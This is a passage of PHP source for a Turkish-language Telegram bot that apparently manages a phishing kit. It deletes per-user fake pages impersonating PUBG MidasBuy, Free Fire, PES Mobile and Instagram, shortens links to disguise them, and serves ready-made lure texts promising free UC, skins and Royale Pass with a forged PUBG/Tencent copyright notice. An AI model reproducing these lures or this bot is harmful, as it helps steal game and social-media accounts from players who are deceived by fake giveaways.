$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("pubg/$from_id/m/*")));
unlink("database-links/$from_id/midasbuy");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • Dizin başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎡 • 𝗖𝗔𝗥𝗞𝗜𝗙𝗘𝗟𝗘𝗞 ، 🧨' and !file_exists("pubg/$from_id/s/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎡 • 𝗖𝗔𝗥𝗞𝗜𝗙𝗘𝗟𝗘𝗞 ، 🧨' and file_exists("pubg/$from_id/s/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("pubg/$from_id/s/*")));
unlink("database-links/$from_id/spin");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • Dizin başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎯 • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 ، 🪔' and !file_exists("freefire/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎯 • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 ، 🪔' and file_exists("freefire/$from_id/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("freefire/$from_id/*")));
unlink("database-links/$from_id/freefire");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • Dizin başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '⚽ • 𝗣𝗘𝗦 𝗠𝗢𝗕𝗜𝗟𝗘 ، 🎪' and !file_exists("pes/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '⚽ • 𝗣𝗘𝗦 𝗠𝗢𝗕𝗜𝗟𝗘 ، 🎪' and file_exists("pes/$from_id/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("pes/$from_id/*")));
unlink("database-links/$from_id/pes");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • Dizin başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎋 • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ، 🪐' and !file_exists("insta/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm canım, bir dizin oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎋 • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ، 🪐' and file_exists("insta/$from_id/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("insta/$from_id/*")));
unlink("database-links/$from_id/insta");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • Dizin başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎋 • Promosyon Hizmetleri , 🎠' or $text == "ɢᴇʀɪ ᴅᴏ̈ɴ ، 🔙"){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/72",
'caption'=>
"💣 • Hoşgeldin canım $name ، 👾

🪐 ، Bu bölüm promosyon uzantıları içindir , 🎉

🎊 ، Aşağıdaki klavyeyi kullanarak bölümler arasında gezinebilirsiniz. , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🀄 • Promosyon Resimleri ، 🎋',],['text'=>'🎠 • Promosyon klişeleri ، 🎪',]],
[['text'=>'📂 • Instagram ، 🎮',],['text'=>'🏝️ • bağlantılar kısayolu ، 🧨',]],
[['text'=>'🏕️ • Referanslar ، 🏝️',]],
],'resize_keyboard'=>true,
])
]);
}


if($text !='🏝️ • bağlantılar kısayolu ، 🧨'){
$short = file_get_contents("https://tinyurl.com/api-create.php?url=$text");
if($short != null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla kısaltıldı, 👋
- orijinal bağlantı × 👇
$text
- kısa bağlantı × 👇
$short
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'ɢᴇʀɪ ᴅᴏ̈ɴ ، 🔙',]],
],'resize_keyboard'=>true,
])
]);
}
}


if($text == '🏝️ • bağlantılar kısayolu ، 🧨'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/77",
'caption'=>
"🧞 • Kısaltmak için bağlantıyı şimdi gönderin ، 🦾
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'ɢᴇʀɪ ᴅᴏ̈ɴ ، 🔙',]],
],'resize_keyboard'=>true,
])
]);
}

if($text == '🎠 • Promosyon klişeleri ، 🎪' or $text == "ɢᴇʀɪ ᴅᴏ̈ɴ 🔙"){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/71",
'caption'=>
"👋 • Hoşgeldin canım $name , 💪

🎯 • Bu bölüm tanıtım klişelerine ayrılmıştır , 🎮

🎠 • Aşağıdaki klavyeden klişeleri seçin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'KalıpBasma 1 ، 🗿',],['text'=>'KalıpBasma 2 ، 🗿',]],
[['text'=>'KalıpBasma 3 ، 🗿',],['text'=>'KalıpBasma 4 ، 🗿',]],
[['text'=>'ɢᴇʀɪ ᴅᴏ̈ɴ ، 🔙',]],
],'resize_keyboard'=>true,
])
]);
}

if($text == 'KalıpBasma 1 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"Artık resmi web sitesinden 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 alabilirsiniz MidasBuy. 💣
UC 1500 + 375 çekebilirsiniz ve sadece bir kez çekebileceğinizi bilerek 1700 UC hesabınızda size ulaşacaktır. Ne duruyorsunuz... 🔥
şansını dene... 😱

• Bağlantıyı buraya koyا 🦅
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'ɢᴇʀɪ ᴅᴏ̈ɴ 🔙',]],
],'resize_keyboard'=>true,
])
]);
}
if($text == 'KalıpBasma 2 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"Silahlarınızı son şekle yükseltebilirsiniz ⚡ Ve hesabınız en güçlü olacak ⭐ Dünyada 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 3850' UC elde edin ! 💴 Her gün hesabınızı geliştirin ve arkadaşlarınızdan daha iyi performans gösterin 🔥 Şimdi Alışveriş Yap 🛒'a tıklayarak satın alın 𝗠𝗜𝗗𝗔𝗦𝗕𝗨𝗬 Ücretsiz ve efsanevi görünümler 👻 Şimdi deneyin 😱 ve sezonu elde edin ve hayallerinizi şimdi gerçekleştirin 💸💸💸
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'ɢᴇʀɪ ᴅᴏ̈ɴ 🔙',]],
],'resize_keyboard'=>true,
])
]);
}
if($text == 'KalıpBasma 3 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"Şirket duyuruları PUBG MOBILE Bu sezon vesilesiyle değerli bir hediye sunarak PUBG MOBILE'ın tüm öğelerine kolayca sahip olabilirsiniz.

• M4 Joker'i ücretsiz edinin 
• Ücretsiz UC alın 8.100 - 24.000
• Ücretsiz bir nadir kıyafet seti alın
• Ücretsiz görünüm silahları alın M4
• Bedava Royale Pass Bu Sezon

• Bağlantıyı buraya koyا 🦅

Nasıl edinilir çok kolay aşağıdaki linke tıklayın
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'ɢᴇʀɪ ᴅᴏ̈ɴ 🔙',]],
],'resize_keyboard'=>true,
])
]);
}
if($text == 'KalıpBasma 4 ، 🗿'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"PUBG MOBİL HEDİYE, Ücretsiz Uc, Gun ve Free Skin🎁.

BAĞLANTIYI TIKLAYIN BURAYA ÜCRETSİZ UC EDİNİN👇

• Bağlantıyı buraya koyا 🦅

20 YORUMLAR 500 UC 💵
30 YORUMLAR 1000 UC💵
40 YORUMLAR 1500 UC💵
50 YORUMLAR 2000 UC💵
SHARE LINK 10000 UC💵

©2022 PUBG Corporation. All rights reversed. Privacy Policy | Tencent Games User Agreement
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'ɢᴇʀɪ ᴅᴏ̈ɴ 🔙',]],
],'resize_keyboard'=>true,
])
]);
}

if($text == '🀄 • Promosyon Resimleri ، 🎋' or $text == "🔚"){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/70",
'caption'=>
"🏝️ ~ Merhaba canım $name , 🎋

🎠 • Bu bölüm tanıtım fotoğrafları içindir ، 🏹

🪐 • Aşağıdaki klavyeden resimleri seçin ، 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'Resim 1 ، ⚜️',],['text'=>'Resim 2 ، ⚜️',]],
[['text'=>'Resim 3 ، ⚜️',],['text'=>'Resim 4 ، ⚜️',]],
[['text'=>'ɢᴇʀɪ ᴅᴏ̈ɴ ، 🔙',]],
],'resize_keyboard'=>true,
])
]);
}

if($text == 'Resim 1 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/57",
'caption'=>
"✅ • İndirme tamamlandı Resim sayı 1 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔚',]],
],'resize_keyboard'=>true,
])
]);
}
if($text == 'Resim 2 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/58",
'caption'=>
"✅ • İndirme tamamlandı Resim sayı 2 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔚',]],
],'resize_keyboard'=>true,
])
]);
}
if($text == 'Resim 3 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/59",
'caption'=>
"✅ • İndirme tamamlandı Resim sayı 3 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔚',]],
],'resize_keyboard'=>true,
])
]);
}
if($text == 'Resim 4 ، ⚜️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/60",
'caption'=>
"✅ • İndirme tamamlandı Resim sayı 4 ، ⚜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔚',]],
],'resize_keyboard'=>true,
])
]);
}
if($text == '📂 • Instagram ، 🎮'){ 
bot('sendDocument',[
'chat_id'=>$chat_id,
'document'=>"https://t.me/DDH_I/65",
'caption'=>
"✅ • Instagram sürümü yüklendi X ، 🏜️
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'ɢᴇʀɪ ᴅᴏ̈ɴ ، 🔙',]],
],'resize_keyboard'=>true,
])
]);
}